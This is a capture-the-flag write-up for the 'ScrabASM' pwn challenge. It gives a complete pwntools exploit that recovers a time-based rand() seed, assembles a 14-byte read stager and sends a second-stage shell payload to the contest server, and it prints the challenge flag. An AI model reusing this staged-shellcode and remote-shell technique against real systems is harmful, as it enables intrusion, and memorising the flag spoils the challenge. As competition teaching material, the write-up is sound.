# ScrabASM

**Category:** pwn

---

#### Description

Scrabble for ASM! A pwn challenge where the program generates 14 random byte "tiles", allows swapping individual tiles (replaced with the next `rand() & 0xFF` value), and then copies the 14-byte hand to an RWX page at `0x13370000` and executes it as shellcode. The key constraints: only 14 bytes of shellcode, swaps produce random values you can't see, and `srand(time(NULL))` seeds the PRNG.

#### Solution

**Approach:** Brute-force the PRNG seed from the displayed initial hand, predict all future `rand()` values, then use a greedy algorithm to construct a 14-byte read stager that loads full shellcode as a second stage.

**Stager shellcode (14 bytes):** Calls `read(0, 0x1337000e, 255)` to read stage 2 shellcode from stdin directly after the stager. After `syscall` returns, execution falls through to offset `0x0e` where stage 2 was written.

```asm
xor eax, eax          ; syscall 0 = read
xor edi, edi           ; fd = 0 (stdin)
cdq                    ; rdx = 0 (sign-extend eax)
mov esi, 0x1337000e    ; buf = right after stager
mov dl, 0xff           ; count = 255
syscall                ; falls through to stage 2 at offset 0x0e
```

**Greedy tile assignment:** Rather than processing tiles sequentially (each tile swapped until correct, \~3000 swaps), each `rand()` value is checked against ALL unfinished tiles. If it matches any tile's target byte, that tile is assigned. Otherwise the value is wasted on any unfinished tile. This reduces swaps from \~3000 to \~800, critical for staying within the server timeout.

```python
#!/usr/bin/env python3
from pwn import *
import ctypes
import time as time_mod
import re

context.arch = 'amd64'
context.os = 'linux'

libc = ctypes.CDLL("libc.so.6")
HAND_SIZE = 14

stager = asm("""
    xor eax, eax
    xor edi, edi
    cdq
    mov esi, 0x1337000e
    mov dl, 0xff
    syscall
""")
assert len(stager) == HAND_SIZE

stage2 = asm(shellcraft.sh())

p = remote("chall.lac.tf", 31338)
connect_time = int(time_mod.time())

data = p.recvuntil(b"> ")
hand_hex = re.findall(r'\| ([0-9a-f]{2}) ', data.decode())
initial_hand = [int(h, 16) for h in hand_hex[:HAND_SIZE]]

# Brute force srand(time(NULL)) seed from displayed hand
found_seed = None
for delta in range(-300, 60):
    seed = connect_time + delta
    libc.srand(seed)
    predicted = [libc.rand() & 0xFF for _ in range(HAND_SIZE)]
    if predicted == initial_hand:
        found_seed = seed
        break
assert found_seed is not None

# Advance PRNG past initial hand generation
libc.srand(found_seed)
for _ in range(HAND_SIZE):
    libc.rand()

# Greedy swap plan
plan = []
sim = list(initial_hand)
unfinished = {}
targets = {}
for i in range(HAND_SIZE):
    if sim[i] != stager[i]:
        unfinished[i] = stager[i]
        targets.setdefault(stager[i], set()).add(i)

while unfinished:
    val = libc.rand() & 0xFF
    if val in targets and targets[val]:
        tile = targets[val].pop()
        if not targets[val]:
            del targets[val]
        del unfinished[tile]
        plan.append(tile)
        sim[tile] = val
    else:
        dummy = next(iter(unfinished))
        plan.append(dummy)
        sim[dummy] = val

# Send all swaps + play as a single batch
payload = b""
for idx in plan:
    payload += f"1\n{idx}\n".encode()
payload += b"2\n"
p.send(payload)

p.recvuntil(b"TRIPLE WORD SCORE!", timeout=300)
time_mod.sleep(0.5)
p.send(stage2)
p.sendline(b"cat /app/flag.txt")
p.interactive()
```

**Flag:** `lactf{gg_y0u_sp3ll3d_sh3llc0d3}`
